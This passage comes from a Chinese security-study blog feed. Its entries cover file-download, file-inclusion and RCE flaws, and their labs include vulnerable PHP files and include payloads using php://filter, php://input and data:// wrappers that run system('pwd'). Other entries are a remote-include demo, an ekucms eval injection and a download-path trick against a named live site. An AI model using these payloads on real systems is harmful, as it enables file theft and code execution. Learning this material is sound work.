variable">$link</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'op'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'op'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select * from member where username='&amp;#123;<span class="token variable">$_SESSION</span>['op']['username']&amp;#125;' and sha1(pw)='&amp;#123;<span class="token variable">$_SESSION</span>['op']['password']&amp;#125;'"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span>execute<span class="token punctuation">(</span><span class="token variable">$link</span>,<span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>mysqli_num_rows<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">==</span>1<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>/*op2的check login*/<span class="token keyword">function</span> check_op2_login<span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'op2'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'op2'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select * from users where username='&amp;#123;<span class="token variable">$_SESSION</span>['op2']['username']&amp;#125;' and sha1(password)='&amp;#123;<span class="token variable">$_SESSION</span>['op2']['password']&amp;#125;'"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span>execute<span class="token punctuation">(</span><span class="token variable">$link</span>,<span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>mysqli_num_rows<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">==</span>1<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>?<span class="token operator">></span></code></pre><h3 id="二、webpath后台扫描"><a href="#二、webpath后台扫描" class="headerlink" title="二、webpath后台扫描"></a><font size="5"><strong>二、webpath后台扫描</strong></font></h3><p><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/2.png"></p><p>类似我们可以加载一些大的字典然后去扫描这样获取到更多的路径增加更多的几率,打开几个地址试试<br><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/3.png"><br><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/4.png"><br><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/5.png"></p><h3 id="三、http-down-znds-com"><a href="#三、http-down-znds-com" class="headerlink" title="三、http://down.znds.com/"></a><font size="5"><strong>三、<a href="http://down.znds.com/">http://down.znds.com/</a></strong></font></h3><p>文件下载漏洞</p><pre class=" language-bash"><code class="language-bash">http://down.znds.com/getdownurl/?s<span class="token operator">=</span>L2Rvd24vMjAyMTA4MDYvdHhzcDE2MTU4XzcuOC4wLjEwMDVfZGFuZ2JlaS5hcGs<span class="token operator">=</span></code></pre><p><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/6.png"></p><p>真实的下载地址<a href="http://down.znds.com/getdownurl/?s=/down/20210806/txsp16158_7.8.0.1005_dangbei.apk">http://down.znds.com/getdownurl/?s=/down/20210806/txsp16158_7.8.0.1005_dangbei.apk</a></p><p>更换下载地址也就存在了文件下载漏洞</p><h3 id="四、buuojCTF"><a href="#四、buuojCTF" class="headerlink" title="四、buuojCTF"></a><font size="5"><strong>四、buuojCTF</strong></font></h3><p><a href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a><br><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/7.png"><br><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/8.png"></p><pre class=" language-bash"><code class="language-bash">爬虫扫描地址-分析参数名参数值-文件操作安全-对应脚本修改提交方式测试-读取 WEB 配置文件 WEB-INF/web.xml访问读取对应地址-访问读取 flag 对应 class 文件-（WEB-INF/classes/com/wm/ctf/FlagController.class）</code></pre><p><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/9.png"><br><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/10.png"><br><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/11.png"></p><p>由于网站的原因后面的题没办法做</p><h3 id="五、小米路由器"><a href="#五、小米路由器" class="headerlink" title="五、小米路由器"></a><font size="5"><strong>五、小米路由器</strong></font></h3><p><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a><br><img src="/2023/10/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-032/12.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-031</title>
      <link href="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/"/>
      <url>/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-文件操作之文件包含漏洞全解"><a href="#WEB漏洞-文件操作之文件包含漏洞全解" class="headerlink" title="WEB漏洞-文件操作之文件包含漏洞全解"></a><font size="6"><strong>WEB漏洞-文件操作之文件包含漏洞全解</strong></font></h2><span id="more"></span><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/1.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#文件包含漏洞</span>原理，检测，类型，利用，修复等<span class="token comment" spellcheck="true">#文件包含各个脚本代码</span>ASP,PHP,JSP,ASPX等<span class="token operator">&lt;</span><span class="token operator">!</span>-—<span class="token comment" spellcheck="true">#include file="1.asp " --></span><span class="token operator">&lt;</span><span class="token operator">!</span>--<span class="token comment" spellcheck="true">#include file="top.aspx"--></span><span class="token operator">&lt;</span>c:import url<span class="token operator">=</span><span class="token string">"http://lthief.one/1.jsp"</span><span class="token operator">></span><span class="token operator">&lt;</span>jsp:include page<span class="token operator">=</span><span class="token string">"head .jsp"</span> / <span class="token operator">></span><span class="token operator">&lt;</span>%@ include file<span class="token operator">=</span><span class="token string">"head.jsp"</span> %<span class="token operator">></span><span class="token operator">&lt;</span>?php Include <span class="token punctuation">(</span> <span class="token string">'test.php '</span> <span class="token punctuation">)</span> ?<span class="token operator">></span></code></pre><h3 id="一、无限制包含漏洞文件"><a href="#一、无限制包含漏洞文件" class="headerlink" title="一、无限制包含漏洞文件"></a><font size="5"><strong>一、无限制包含漏洞文件</strong></font></h3><pre class=" language-bash"><code class="language-bash">root@f3d91c74e2ee:/var/www/html<span class="token comment" spellcheck="true"># cat include.php</span><span class="token operator">&lt;</span>?php<span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>include <span class="token punctuation">(</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//http://127.0.0.1:8080/include.php?filename<span class="token operator">=</span>index.txt/*<span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>include <span class="token punctuation">(</span> <span class="token variable">$filename</span> <span class="token keyword">.</span><span class="token string">" .html"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>*/?<span class="token operator">></span></code></pre><p>index.txt</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php    phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/2.png"><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/3.png"><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/4.png"></p><h3 id="二、有限制文件包含漏洞"><a href="#二、有限制文件包含漏洞" class="headerlink" title="二、有限制文件包含漏洞"></a><font size="5"><strong>二、有限制文件包含漏洞</strong></font></h3><p><font color=red><strong>未完成</strong></font></p><pre class=" language-bash"><code class="language-bash">root@f3d91c74e2ee:/var/www/html<span class="token comment" spellcheck="true"># cat include.php</span><span class="token operator">&lt;</span>?php<span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>include<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token keyword">.</span><span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><h3 id="三、远程包含"><a href="#三、远程包含" class="headerlink" title="三、远程包含"></a><font size="5"><strong>三、远程包含</strong></font></h3><p>条件<br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/5.png"></p><p>在远程服务器上创建readme.txt并访问</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php    phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/6.png"></p><p>远程包含漏洞利用<a href="http://10.1.1.7:49153/include.php?filename=http://10.1.1.6/readme.txt">http://10.1.1.7:49153/include.php?filename=http://10.1.1.6/readme.txt</a><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/7.png"></p><h3 id="四、协议玩法"><a href="#四、协议玩法" class="headerlink" title="四、协议玩法"></a><font size="5"><strong>四、协议玩法</strong></font></h3><p><a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a><br>PHP支持的伪协议</p><pre class=" language-bash"><code class="language-bash">file:// — 访问本地文件系统http:// — 访问 HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> 网址ftp:// — 访问 FTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流</code></pre><p><strong>php.ini参数设置</strong><br>在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。<br>allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；<br>allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件；</p><p><strong>各协议的利用条件和方法</strong><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/8.png"></p><p><strong>php:&#x2F;&#x2F;input</strong><br>php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。<br><strong>注：当enctype&#x3D;”multipart&#x2F;form-data”时，php:&#x2F;&#x2F;input是无效的。</strong></p><p><strong>file:&#x2F;&#x2F;</strong><br>用于访问本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。<br>用法：</p><pre class=" language-bash"><code class="language-bash">file://<span class="token punctuation">[</span>文件的绝对路径和文件名<span class="token punctuation">]</span></code></pre><p><a href="http://127.0.0.1/include.php?file=file://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.txt">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</a><br>2、[文件的相对路径和文件名]<br><a href="http://127.0.0.1/include.php?file=./phpinfo.txt">http://127.0.0.1/include.php?file=./phpinfo.txt</a></p><p><strong>http:&#x2F;&#x2F;、https:&#x2F;&#x2F;</strong><br>URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源，通常用于远程包含。<br>用法：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>http：//网络路径和文件名<span class="token punctuation">]</span></code></pre><p><a href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a></p><p><strong>php:&#x2F;&#x2F;</strong><br>php:&#x2F;&#x2F; 用于访问各个输入&#x2F;输出流（I&#x2F;O streams），经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input，php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码。</p><table>    <thead>        <tr>            <th>Va协议lue</th>            <th>作用</th>        </tr>    </thead>    <tbody>        <tr>            <td>php://input</td>            <td>enctype="multipart/form-data" 的时候php://input 是无效的。</td>        </tr>        <tr>            <td>/php://output</td>            <td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>        </tr>        <tr>            <td>php://fd</td>            <td>(>=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</td>        </tr>        <tr>            <td>php://memory php://temp</td>            <td>(>=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</td>        </tr>        <tr>            <td>php://filter</td>            <td>(>=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</td>        </tr>    </tbody></table><p><strong>php:&#x2F;&#x2F;filter参数详解</strong></p><table>    <thead>        <tr>            <th>resource=<要过滤的数据流></th>            <th>必须项。它指定了你要筛选过滤的数据流。</th>        </tr>    </thead>    <tbody>        <tr>            <td>read=<读链的过滤器></td>            <td>该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td>        </tr>        <tr>            <td>write=<写链的筛选列表></td>            <td>该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td>        </tr>        <tr>            <td><; 两个链的过滤器></td>            <td>任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。</td>        </tr>    </tbody></table><p><strong>可用的过滤器列表（4类）</strong></p><table>    <thead>        <tr>            <th>字符串过滤器</th>            <th>作用</th>        </tr>    </thead>    <tbody>        <tr>            <td>string.rot13</td>            <td>等同于str_rot13()，rot13变换</td>        </tr>        <tr>            <td>string.toupper</td>            <td>等同于strtoupper()，转大写字母</td>        </tr>        <tr>            <td>string.tolower</td>            <td>等同于strtolower()，转小写字母</td>        </tr>            <td>string.strip_tags</td>            <td>等同于strip_tags()，去除html、PHP语言标签</td>        </tr>    </tbody></table><table>    <thead>        <tr>            <th>转换过滤器</th>            <th>作用</th>        </tr>    </thead>    <tbody>        <tr>            <td>convert.base64-encode & convert.base64-decode</td>            <td>等同于base64_encode()和base64_decode()，base64编码解码</td>        </tr>        <tr>            <td>convert.quoted-printable-encode & convert.quoted-printable-decode</td>            <td>quoted-printable 字符串与 8-bit 字符串编码解码</td>        </tr>    </tbody></table><table>    <thead>        <tr>            <th>压缩过滤器</th>            <th>作用</th>        </tr>    </thead>    <tbody>        <tr>            <td>zlib.deflate & zlib.inflate</td>            <td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>        </tr>        <tr>            <td>bzip2.compress & bzip2.decompress</td>            <td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>        </tr>    </tbody></table><table>    <thead>        <tr>            <th>加密过滤器</th>            <th>作用</th>        </tr>    </thead>    <tbody>        <tr>            <td>mcrypt.*</td>            <td>libmcrypt 对称加密算法</td>        </tr>        <tr>            <td>mdecrypt.*</td>            <td>libmcrypt 对称解密算法</td>        </tr>    </tbody></table><p><strong>读取文件源码用法</strong></p><pre class=" language-bash"><code class="language-bash">php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span><span class="token punctuation">[</span>文件名<span class="token punctuation">]</span>http://127.0.0.1/include.php?file<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>phpinfo.php</code></pre><p><strong>执行php代码用法</strong></p><pre class=" language-bash"><code class="language-bash">php://input + <span class="token punctuation">[</span>POST DATA<span class="token punctuation">]</span>http://127.0.0.1/include.php?file<span class="token operator">=</span>php://input<span class="token punctuation">[</span>POST DATA部分<span class="token punctuation">]</span><span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span></code></pre><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/19.png"><br><strong>phar:&#x2F;&#x2F;、zip:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;</strong><br>用于读取压缩文件，zip:&#x2F;&#x2F; 、 bzip2:&#x2F;&#x2F; 、 zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</p><p><strong>用法示例</strong></p><pre class=" language-bash"><code class="language-bash">1、zip://<span class="token punctuation">[</span>压缩文件绝对路径<span class="token punctuation">]</span>%23<span class="token punctuation">[</span>压缩文件内的子文件名<span class="token punctuation">]</span>（<span class="token comment" spellcheck="true">#编码为%23）</span>http://127.0.0.1/include.php?file<span class="token operator">=</span>zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt 2、compress.bzip2://file.bz2http://127.0.0.1/include.php?file<span class="token operator">=</span>compress.bzip2://D:/soft/phpStudy/WWW/file.jpghttp://127.0.0.1/include.php?file<span class="token operator">=</span>compress.bzip2://./file.jpg 3、compress.zlib://file.gzhttp://127.0.0.1/include.php?file<span class="token operator">=</span>compress.zlib://D:/soft/phpStudy/WWW/file.jpghttp://127.0.0.1/include.php?file<span class="token operator">=</span>compress.zlib://./file.jpg4、phar://</code></pre><p><strong>data:&#x2F;&#x2F;</strong><br>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p><pre class=" language-bash"><code class="language-bash">1、data://text/plain,http://127.0.0.1/include.php?file<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php%20phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span> 2、data://text/plain<span class="token punctuation">;</span>base64,http://127.0.0.1/include.php?file<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><h4 id="filter演示"><a href="#filter演示" class="headerlink" title="filter演示"></a><font size="4"><strong>filter演示</strong></font></h4><p><a href="http://10.1.1.7:49153/include.php?filename=php://filter/read=convert.base64-encode/resource=index.html%E8%AF%BB%E5%8F%9610.1.1.7%E4%B8%ADindex.php%E6%96%87%E4%BB%B6%E4%BB%A5base64%E7%BC%96%E7%A0%81%E8%BE%93%E5%87%BA">http://10.1.1.7:49153/include.php?filename=php://filter/read=convert.base64-encode/resource=index.html读取10.1.1.7中index.php文件以base64编码输出</a></p><pre class=" language-bash"><code class="language-bash">root@f3d91c74e2ee:/var/www/html<span class="token comment" spellcheck="true"># cat index.html</span><span class="token operator">&lt;</span>?php        phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/9.png"><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/10.png"></p><h4 id="input演示"><a href="#input演示" class="headerlink" title="input演示"></a><font size="4"><strong>input演示</strong></font></h4><p>由于我的hackbar没法提交post数据所以这个没法演示</p><h4 id="file演示"><a href="#file演示" class="headerlink" title="file演示"></a><font size="4"><strong>file演示</strong></font></h4><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/11.png"><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/12.png"></p><p>file:&#x2F;&#x2F;需要的是完整的路径</p><h4 id="data演示"><a href="#data演示" class="headerlink" title="data演示"></a><font size="4"><strong>data演示</strong></font></h4><pre class=" language-bash"><code class="language-bash">http://10.1.1.7:49153/include.php?filename<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/13.png"></p><pre class=" language-bash"><code class="language-bash">http://10.1.1.7:49153/include.php?filename<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token string">'pwd'</span><span class="token punctuation">)</span>?<span class="token operator">></span></code></pre><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/14.png"></p><pre class=" language-bash"><code class="language-bash">http://10.1.1.7:49153/include.php?filename<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php <span class="token keyword">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span><span class="token variable">`</span></span>?<span class="token operator">></span></code></pre><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/15.png"></p><h3 id="五、南邮杯CTF"><a href="#五、南邮杯CTF" class="headerlink" title="五、南邮杯CTF"></a><font size="5"><strong>五、南邮杯CTF</strong></font></h3><p><a href="http://4.chinalover.sinaapp.com/web7/index.php">http://4.chinalover.sinaapp.com/web7/index.php</a></p><pre class=" language-bash"><code class="language-bash">http://4.chinalover.sinaapp.com/web7/index.php?file<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>index.php</code></pre><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/16.png"><br><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/17.png"></p><h3 id="六、ekucms文件包含"><a href="#六、ekucms文件包含" class="headerlink" title="六、ekucms文件包含"></a><font size="5"><strong>六、ekucms文件包含</strong></font></h3><pre class=" language-bash"><code class="language-bash">http://10.1.1.7:49153/index.php?s<span class="token operator">=</span>my/show/id/<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;~eval($_POST[x])&amp;#125;</span></code></pre><p><img src="/2023/10/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-031/18.png"></p><pre class=" language-bash"><code class="language-bash">root@f3d91c74e2ee:/var/www/html/temp/Logs<span class="token comment" spellcheck="true"># pwd</span>/var/www/html/temp/Logsroot@f3d91c74e2ee:/var/www/html/temp/Logs<span class="token comment" spellcheck="true"># ls</span>21_08_15.logroot@f3d91c74e2ee:/var/www/html/temp/Logs<span class="token comment" spellcheck="true"># cat 21_08_15.log</span><span class="token punctuation">[</span> 2021-08-15T21:57:58+08:00 <span class="token punctuation">]</span> ERR: <span class="token punctuation">(</span>ThinkException<span class="token punctuation">)</span> 模板不存在<span class="token punctuation">[</span>./template/default/Home/my_<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;~eval($_POST[x])&amp;#125;.html]</span>root@f3d91c74e2ee:/var/www/html/temp/Logs<span class="token comment" spellcheck="true">#</span></code></pre><p>利用环节未完成版本有问题</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-030</title>
      <link href="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/"/>
      <url>/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-RCE代码及命令执行漏洞全解"><a href="#WEB漏洞-RCE代码及命令执行漏洞全解" class="headerlink" title="WEB漏洞-RCE代码及命令执行漏洞全解"></a><font size="6"><strong>WEB漏洞-RCE代码及命令执行漏洞全解</strong></font></h2><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size="5"><strong>前言</strong></font></h3><p>前言： 在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏 洞。同样调用系统命令处理，将造成命令执行漏洞。<br><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/1.png"></p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a><font size="5"><strong>PHP</strong></font></h3><p>eval()函数中的eval是evaluate的简称，这个函数的作用就是把一段字符串当作PHP语句来执行，一般情况下不建议使用容易被黑客利用。<br>在服务器上创建以下代码</p><pre class=" language-bash"><code class="language-bash">root@ae63a3df5e26:/var/www/html<span class="token comment" spellcheck="true"># cat test.php</span><span class="token operator">&lt;</span>?php        <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        eval<span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/2.png"></p><pre class=" language-bash"><code class="language-bash">root@ae63a3df5e26:/var/www/html<span class="token comment" spellcheck="true"># cat test.php</span><span class="token operator">&lt;</span>?php        <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> system<span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/3.png"></p><p>形成漏洞的原因：可控变量，函数漏洞</p><h3 id="pikachu-RCE"><a href="#pikachu-RCE" class="headerlink" title="pikachu RCE"></a><font size="5"><strong>pikachu RCE</strong></font></h3><p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/4.png"><br><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/5.png"><br><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/6.png"><br><img 